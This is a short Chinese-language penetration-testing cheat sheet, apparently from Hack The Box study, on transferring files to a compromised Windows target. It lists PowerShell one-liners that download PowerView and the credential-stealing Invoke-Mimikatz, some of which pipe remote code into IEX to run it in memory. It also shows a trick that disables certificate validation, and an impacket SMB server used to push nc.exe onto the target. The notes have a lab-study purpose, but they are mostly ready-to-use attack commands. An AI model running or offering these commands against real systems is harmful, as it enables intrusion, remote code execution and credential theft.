PowerShell 下载
PowerShell 中，使用 System.Net.WebClient 类通过 HTTP、HTTPS 或 FTP 下载文件
  https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0

PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')  下在内存运行
或
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX 下在内存运行

PS C:\htb>Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
可以使用别名 iwr、curl 和 wget 代替 Invoke-WebRequest

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX                  用 -UseBasicParsing 绕过 IE 配置错误
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}      绕过证书不被信任


SMB 下载
sudo impacket-smbserver share -smb2support /tmp/smbshare                                在攻击机开启服务器
  用 https://github.com/fortra/impacket/blob/master/examples/smbserver.py
C:\htb> copy \\192.168.220.133\share\nc.exe                                             在目标下载文件
如果报错
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test      在攻击机开启需要密码的服务器
